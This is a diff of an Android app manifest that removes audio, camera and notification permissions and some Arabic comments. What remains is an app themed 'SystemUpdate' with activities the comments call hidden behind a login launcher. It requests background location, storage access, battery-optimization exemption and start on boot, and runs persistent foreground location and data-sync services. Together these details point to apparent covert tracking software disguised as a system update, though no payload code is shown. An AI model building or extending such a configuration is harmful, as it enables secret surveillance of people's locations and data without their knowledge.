@@ -5,18 +5,10 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-feature android:name="android.hardware.camera" android:required="false" />
-    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
-
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
-    <!-- Storage — كل الإصدارات -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
@@ -33,7 +25,6 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
@@ -49,7 +40,6 @@
         android:largeHeap="true"
         android:theme="@style/Theme.SystemUpdate">
 
-        <!-- LoginActivity — الـ Launcher -->
         <activity
             android:name=".LoginActivity"
             android:exported="true"
@@ -62,7 +52,6 @@
             </intent-filter>
         </activity>
 
-        <!-- MainActivity — مخفية -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -71,14 +60,12 @@
             android:launchMode="singleTask"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- WebViewActivity — مخفية -->
         <activity
             android:name=".WebViewActivity"
             android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <!-- Background Service -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
@@ -86,7 +73,6 @@
             android:foregroundServiceType="location|dataSync"
             android:stopWithTask="false" />
 
-        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
